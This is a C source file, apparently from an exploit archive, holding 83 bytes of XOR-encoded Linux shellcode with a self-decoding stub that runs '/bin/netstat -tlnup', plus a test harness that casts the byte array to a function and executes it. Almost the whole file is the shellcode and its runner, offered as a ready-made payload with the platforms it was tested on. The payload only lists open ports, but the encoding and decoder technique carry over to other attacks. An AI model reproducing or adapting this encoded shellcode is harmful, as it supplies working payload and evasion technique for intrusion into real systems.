/*
 * sys_execve("/bin/netstat", { "/bin/netstat", "-tlnup" }, NULL) 83 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in : 
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>

char tlnup[] = "\xeb\x0d\x5e\x31\xc9\xb1\x3f\x80\x36\x55"
	       "\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
	       "\x64\x95\xd6\xb9\x54\xdd\x51\x71\x3d\x39"
	       "\x3b\x20\x25\x33\x3d\x78\x21\xdc\xb3\xd6"
	       "\xb9\x54\xdd\x51\x71\x3d\x26\x21\x34\x21"
	       "\x3d\x7a\x3b\x30\x21\x3d\x7a\x37\x3c\x3b"
	       "\xdc\xb6\xd6\xb9\x54\xdd\x51\x71\x05\x03"
	       "\x06\xe5\x5e\xdc\xb4\x98\xd5\x64\x95\xe5"
	       "\x54\x98\xd5";

int main(void) {
  int tlnup_len = strlen(tlnup);
  printf("[+] Using mutation key engine : 0x55\n");
  printf("[+] Length of this shellcode is : %d bytes\n\n", tlnup_len);
  (*(void(*)())tlnup)();
  return 0;
}

/* devilzc0de.org, hacker-newbie, sdf.lonestar.org, 1337day.com */